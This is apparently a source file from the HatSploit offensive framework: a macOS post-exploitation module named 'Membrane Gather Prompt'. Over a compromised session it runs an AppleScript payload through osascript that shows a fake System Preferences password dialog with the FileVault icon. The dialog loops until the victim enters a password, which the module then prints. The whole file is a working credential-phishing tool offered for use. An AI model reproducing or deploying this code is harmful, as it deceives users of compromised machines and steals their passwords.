#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from core.lib.module import HatSploitModule
from core.base.sessions import sessions

class HatSploitModule(HatSploitModule):
    sessions = sessions()

    details = {
        'Name': "macOS Membrane Gather Prompt",
        'Module': "post/macos/membrane/gather/prompt",
        'Authors': [
            'enty8080'
        ],
        'Description': "Prompt user to type password.",
        'Dependencies': [
            ''
        ],
        'Comments': [
            ''
        ],
        'Risk': "high"
    }

    options = {
        'SESSION': {
            'Description': "Session to run on.",
            'Value': 0,
            'Required': True
        }
    }

    def run(self):
        session = self.sessions.get_session("macos/membrane", self.parser.parse_options(self.options))
        if session:
            self.badges.output_process("Waiting for prompt window to appear...")

            payload = """
            tell application "Finder"
                activate
                set myprompt to "Type your password to allow System Preferences to make changes"
                set ans to "Cancel"
                repeat
                    try
                        set d_returns to display dialog myprompt default answer "" with hidden answer buttons {"Cancel", "OK"} default button "OK" with icon path to resource "FileVaultIcon.icns" in bundle "/System/Library/CoreServices/CoreTypes.bundle"
                        set ans to button returned of d_returns
                        set mypass to text returned of d_returns
                        if mypass > "" then exit repeat
                    end try
                end repeat
                try
                    do shell script "echo " & quoted form of mypass
                end try
            end tell
            """
            self.badges.output_process("Waiting for user to type password...")

            status, output = session.send_command("osascript", payload)
            if not status:
                self.badges.output_error("Failed to prompt user to type password!")
            else:
                self.badges.output_information("User Entered: " + output)
